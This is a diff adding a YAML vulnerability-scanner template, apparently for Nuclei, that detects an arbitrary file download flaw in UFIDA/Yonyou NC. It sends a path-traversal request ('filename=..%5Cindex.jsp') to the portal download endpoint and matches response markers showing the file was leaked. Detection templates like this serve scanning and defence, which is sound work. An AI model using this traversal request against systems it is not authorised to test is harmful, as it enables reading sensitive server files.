@@ -1,0 +1,29 @@
+id: poc-yaml-yonyou-ufida-nc-download-file-download
+info:
+  name: UFIDA-NC Arbitrary File Download Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-read
+  description: |
+    UFIDA-NC contains a file download vulnerability that allows attackers to download arbitrary files from the server.
+http:
+  - method: GET
+    path:
+      - "/portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "nc.uap.lfw.core.LfwRuntimeEnvironment"
+      - type: word
+        part: header
+        words:
+          - "filename=..\\index.jsp"
+      - type: word
+        part: header
+        words:
+          - "application/x-msdownload"
